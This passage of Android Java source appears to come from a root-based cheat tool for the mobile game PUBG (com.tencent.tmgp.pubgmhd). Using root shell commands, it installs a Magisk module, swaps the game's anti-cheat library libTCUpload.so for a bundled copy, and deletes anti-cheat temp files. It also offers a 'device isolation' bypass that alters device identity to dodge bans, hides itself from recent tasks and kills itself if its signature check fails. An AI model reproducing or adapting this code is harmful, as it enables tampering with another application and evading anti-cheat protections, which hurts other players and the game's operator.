            RootUtil.runShell("/system/bin/rm -r " + new File(Objects.requireNonNull(new File(pi.applicationInfo.publicSourceDir).getParentFile()).getAbsolutePath() + "/oat"), true);

            RootUtil.runShell("/system/bin/pm path com.tencent.tmgp.pubgmhd|sed -E  's/(.*):(.*)/\\2/'|xargs pm install -r --abi arm64-v8a", true);

        } catch (Exception ignored) {

        }

        try {
            pi = getPackageManager().getPackageInfo(GAME_PACKAGE_NAME, 0);
        } catch (Throwable ignored) {

        }

        final String gamePath = pi.applicationInfo.publicSourceDir;
        new Handler(Looper.getMainLooper()).post(() -> {
            if (!RootUtil.runShell("/system/bin/ls " + Objects.requireNonNull(new File(gamePath).getParentFile()).getAbsolutePath() + "/oat", true).contains("64")) {
                Toasty.error(MainActivity.this, "初始化失败,辅助可能无效果,请在主页点击配置环境,或把游戏 卸载重装", Toast.LENGTH_LONG).show();
            } else {
                Toasty.success(MainActivity.this, "初始化完成", Toast.LENGTH_LONG).show();
            }
            if (mode == 1) {
                mHandler.sendEmptyMessage(0);
            }
            mProgressDialog.dismiss();

        });
    }


    private boolean isContain(String string, String s) {
        try {
            return string.contains(s);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }


    @RequiresApi(api = Build.VERSION_CODES.M)


    /**
     * 获取面具模块版本
     *
     * @param moduleName
     * @return
     */
    @SuppressLint("RestrictedApi")
    public static String getModulesVersion(String moduleName) {
        try {
            SuFile file = new SuFile("/data/adb/lite-modules/" + moduleName + "/module.prop");
            if (file.exists()) {
                InputStream instream = IOFactory.fifoIn(file);
                InputStreamReader inputreader = new InputStreamReader(instream);
                BufferedReader buffreader = new BufferedReader(inputreader);

                String line;
                while ((line = buffreader.readLine()) != null) {
                    if (line.contains("version=")) {
                        return line.replace("version=", "");
                    }
                }
                instream.close();
            } else {
                SuFile liteFile = new SuFile("/data/adb/modules/" + moduleName + "/module.prop");
                if (liteFile.exists()) {
                    InputStream instream = IOFactory.fifoIn(liteFile);
                    InputStreamReader inputreader = new InputStreamReader(instream);
                    BufferedReader buffreader = new BufferedReader(inputreader);

                    String line;
                    while ((line = buffreader.readLine()) != null) {
                        if (line.contains("version=")) {
                            return line.replace("version=", "");
                        }
                    }
                    instream.close();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }


    /**
     * 初始化
     */
    public void installModules() {
        mProgressDialog = createProgressDialog("请等待一会...", "正在加载...");
        mProgressDialog.setCancelable(false);
        mProgressDialog.show();
        loadAssets(MODE_NAME + ".zip");
        RootUtil.runShell("magisk --install-module " + getFilesDir().getAbsolutePath() + "/" + MODE_NAME + ".zip", true);
        //清理
        RootUtil.runShell("/system/bin/rm -r " + App.getFilePath(), true);

        PackageInfo pi = null;
        try {
            pi = getPackageManager().getPackageInfo(GAME_PACKAGE_NAME, 0);
        } catch (Throwable th) {
            Log.d(TAG, "onCreate: " + Log.getStackTraceString(th));
        }
        final String gamePath = pi.applicationInfo.publicSourceDir;
        if (!RootUtil.runShell("/system/bin/ls " + Objects.requireNonNull(new File(gamePath).getParentFile()).getAbsolutePath() + "/oat", true).contains("64")) {
            new Thread(() -> {
                try {
                    if (!GAME_PACKAGE_NAME.contains("ig")) {
                        changeAbi(1);
                    } else {
                        mProgressDialog.dismiss();
                        mHandler.sendEmptyMessage(0);
                        Toasty.success(MainActivity.this, "配置环境结束", Toast.LENGTH_LONG).show();
                    }
                } catch (Exception E) {
                    E.printStackTrace();
                }
            }).start();
        } else {
            mProgressDialog.dismiss();
            mHandler.sendEmptyMessage(0);
            Toasty.success(MainActivity.this, "配置环境结束", Toast.LENGTH_LONG).show();
        }
    }

    /**
     * 环境检测
     */
    void Environmental() {
        //恢复TCUpload 文件
        if (isMagisk) {
            loadAssets("libTCUpload.so");
            @SuppressLint("SdCardPath") String gamelibrarypath = "/data/data/" + GAME_PACKAGE_NAME + "/lib";
            try {
                gamelibrarypath = getPackageManager().getPackageInfo(GAME_PACKAGE_NAME, 0).applicationInfo.nativeLibraryDir;
                RootUtil.runShell("/system/bin/cp -f " + mContext.getFilesDir().getAbsolutePath() + "/libTCUpload.so" + " " + "/storage/emulated/0/libTCUpload.so", true);
                RootUtil.runShell("/system/bin/mv " + "/storage/emulated/0/libTCUpload.so" + " " + gamelibrarypath + "/libTCUpload.so", true);
                RootUtil.runShell("/system/bin/chmod -R 0755 " + gamelibrarypath, true);
                RootUtil.runShell("/system/bin/rm -f " + mContext.getFilesDir().getAbsolutePath() + "/libTCUpload.so", true);

                LogUtils.D("GameInject", gamelibrarypath);
            } catch (PackageManager.NameNotFoundException e) {
                Toasty.error(this, "获取失败", Toast.LENGTH_LONG).show();
                e.printStackTrace();
            }
        } else {
            @SuppressLint("SdCardPath") String gamelibrarypath = "/data/data/" + GAME_PACKAGE_NAME + "/lib";
            try {
                gamelibrarypath = getPackageManager().getPackageInfo(GAME_PACKAGE_NAME, 0).applicationInfo.nativeLibraryDir;
                for (File listFile : Objects.requireNonNull(new File(getApplicationInfo().nativeLibraryDir).listFiles())) {
                    if (listFile.getName().contains("TCUpload")) {
                        RootUtil.runShell("/system/bin/cp -f " + listFile.getAbsolutePath() + " " + "/storage/emulated/0/" + listFile.getName(), true);
                        try {
                            hashTab("/storage/emulated/0/" + listFile.getName());
                        } catch (Exception e) {
                            Toasty.error(this, "加载配置文件失败,请检查各项权限", Toast.LENGTH_LONG).show();
                            e.printStackTrace();
                        }
                        RootUtil.runShell("/system/bin/mv " + "/storage/emulated/0/" + listFile.getName() + " " + gamelibrarypath + "/" + listFile.getName(), true);
                        RootUtil.runShell("/system/bin/chmod -R 0755 " + gamelibrarypath, true);
                    }
                }
            } catch (PackageManager.NameNotFoundException e) {
                Toasty.error(this, "获取失败", Toast.LENGTH_LONG).show();
                e.printStackTrace();
            }
        }
        //签名校验
        String cert_sha1 = "2AB65AE1F85E61FF3E20FBF8A26EAA4DFF0169F5"; // 通过调试提前获取apk的sha1签名
        boolean is_org_app = false;
        try {
            is_org_app = 看你妈(this, cert_sha1);
        } catch (PackageManager.NameNotFoundException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        if (!is_org_app) {
            mAppConfig.isAbnormal = true;
            android.os.Process.killProcess((android.os.Process.myPid()));
        }

        //删除旧版本模块
        if (RootUtil.runShell("/system/bin/ls /data/adb/modules", true).contains(OLE_MODE_NAME) || RootUtil.runShell("/system/bin/ls /data/adb/lite-modules", true).contains(OLE_MODE_NAME)) {
            RootUtil.runShell("/system/bin/rm -r /data/adb/modules/" + OLE_MODE_NAME, true);
            RootUtil.runShell("/system/bin/rm -r /data/adb/lite-modules/" + OLE_MODE_NAME, true);
            Toasty.error(this, "旧版模块已删除,重启生效", Toast.LENGTH_LONG).show();
        }

        //删除旧版本模块
        if (RootUtil.runShell("/system/bin/ls /data/adb/modules", true).contains(OLE_MODE_NAME2) || RootUtil.runShell("/system/bin/ls /data/adb/lite-modules", true).contains(OLE_MODE_NAME2)) {
            RootUtil.runShell("/system/bin/rm -r /data/adb/modules/" + OLE_MODE_NAME2, true);
            RootUtil.runShell("/system/bin/rm -r /data/adb/lite-modules/" + OLE_MODE_NAME2, true);
            Toasty.error(this, "旧版模块已删除,重启生效", Toast.LENGTH_LONG).show();
        }

        /////检测游戏储存权限
        boolean permission = (PackageManager.PERMISSION_GRANTED == getPackageManager().checkPermission("android.permission.READ_EXTERNAL_STORAGE", GAME_PACKAGE_NAME));
        if (!permission) {
            CustomDialog dialog = new CustomDialog(this);
            dialog.setTitle("温馨提示");
            dialog.setMessage("请给予游戏文件存储权限后再使用!");
            dialog.setCanceledOnTouchOutside(false);
            dialog.setCancelable(false);
            dialog.setButton(DialogInterface.BUTTON_POSITIVE, "确定", (thisDialog, which) -> {
                Intent localIntent = new Intent();
                localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                if (Build.VERSION.SDK_INT >= 9) {
                    localIntent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
                    localIntent.setData(Uri.fromParts("package", GAME_PACKAGE_NAME, null));
                } else if (Build.VERSION.SDK_INT <= 8) {
                    localIntent.setAction(Intent.ACTION_VIEW);
                    localIntent.setClassName("com.android.settings", "com.android.settings.InstalledAppDetails");
                    localIntent.putExtra("com.android.settings.ApplicationPkgName", GAME_PACKAGE_NAME);
                }
                startActivity(localIntent);
            });
            dialog.show();
            return;
        }

        ////////检测环境是不是64位
        PackageInfo pi = null;
        try {
            pi = getPackageManager().getPackageInfo(GAME_PACKAGE_NAME, 0);
        } catch (Throwable th) {
            Log.d(TAG, "onCreate: " + Log.getStackTraceString(th));
        }
        final String gamePath = pi.applicationInfo.publicSourceDir;
        if (!RootUtil.runShell("/system/bin/ls " + Objects.requireNonNull(new File(gamePath).getParentFile()).getAbsolutePath() + "/oat", true).contains("64")) {
            mProgressDialog = createProgressDialog("初始化游戏环境", "正在加载...");
            mProgressDialog.show();
            new Thread(() -> {
                try {
                    changeAbi(2);
                } catch (Exception E) {
                    E.printStackTrace();
                }
            }).start();
        }
        //清理
        try {
            RootUtil.runShell("/system/bin/rm -r /storage/emulated/0/imgui_init/init", true);
            RootUtil.runShell("/system/bin/rm -r /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/mtcj_timecast.txt", true);
            Toasty.success(this, "已残留部分清理", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
        }

        //写出图片字体
        Thread t = new Thread(() -> {
            loadAssets("imgui_init.rar");
            RootUtil.runShell("/system/bin/mkdir " + "/storage/emulated/0/Download", true);
            RootUtil.runShell("/system/bin/mkdir " + "/storage/emulated/0/Download/IMGUI", true);
            RootUtil.runShell("/system/bin/mv " + getFilesDir().toString() + "/imgui_init.rar" + " " + "/storage/emulated/0/Download/IMGUI/", true);
            ZipUtil.decompressZip("/storage/emulated/0/Download/IMGUI/imgui_init.rar", "/storage/emulated/0/Download/IMGUI/");
            RootUtil.runShell("/system/bin/rm -r " + "/storage/emulated/0/Download/IMGUI/imgui_init.rar", true);
        });
        t.start();
    }

    /**
     * 清理过隔离
     */
    private void overIsolation() {
        CustomDialog mCustomDialog = new CustomDialog(this);
        mCustomDialog.setTitle("温馨提示");
        mCustomDialog.setMessage("是否过需要过设备隔离?");
        mCustomDialog.setCanceledOnTouchOutside(false);
        mCustomDialog.setCancelable(false);
        mCustomDialog.setButton(DialogInterface.BUTTON_POSITIVE, "确定", (dialogs, which) -> {
            mCustomDialog.cancel();
            mProgressDialog = new CustomProgressDialog(MainActivity.this);
            mProgressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
            mProgressDialog.setTitle("清理中...");
            mProgressDialog.setMessage("正在过设备隔离清理数据中...");
            mProgressDialog.setCancelable(true);
            mProgressDialog.setCanceledOnTouchOutside(false);
            mProgressDialog.show();
            ChangeDeviceInfo();
        });
        mCustomDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "取消", (dialog1, which) -> dialog1.cancel());
        mCustomDialog.show();
    }

    /**
     * 隐藏后台
     */
    private void excludeInRecentTask(boolean is) {
        /* 隐藏后台 */
        ActivityManager activityManager;
        if ((activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE)) != null) {
            for (ActivityManager.AppTask next : activityManager.getAppTasks()) {
                if (next.getTaskInfo().id == getTaskId()) {
                    next.setExcludeFromRecents(is);
                }
            }
        }
    }


    /**
     * 过电量白名单
     */
    @SuppressLint("QueryPermissionsNeeded")
    @RequiresApi(api = Build.VERSION_CODES.M)
    private void requestPowerOptimizations() {
        /* 电量白名单 */
        if (!BearHelper.isIgnoringBatteryOptimizations()) {
            @SuppressLint("BatteryLife")
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            }
        }
    }


    /**
     * 检测是否恶意跳转
     */
    private void checkToken() {
        if (TextUtils.isEmpty(mAppConfig.mToken) || mAppConfig.isAbnormal || mAppConfig.isVPN) {
            Toasty.error(mContext, "Token为空，请重新登录！", Toast.LENGTH_SHORT).show();
            getMainHandler().postDelayed(MainActivity.this::finish, 3000);
        }
    }

    @Override
    public void onDestroy() {
        LogUtils.D(TAG, "销毁界面");
        super.onDestroy();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            onBackPressed();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onBackPressed() {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory(Intent.CATEGORY_HOME);
        startActivity(intent);
        LogUtils.D(TAG, "进入桌面");
    }


}

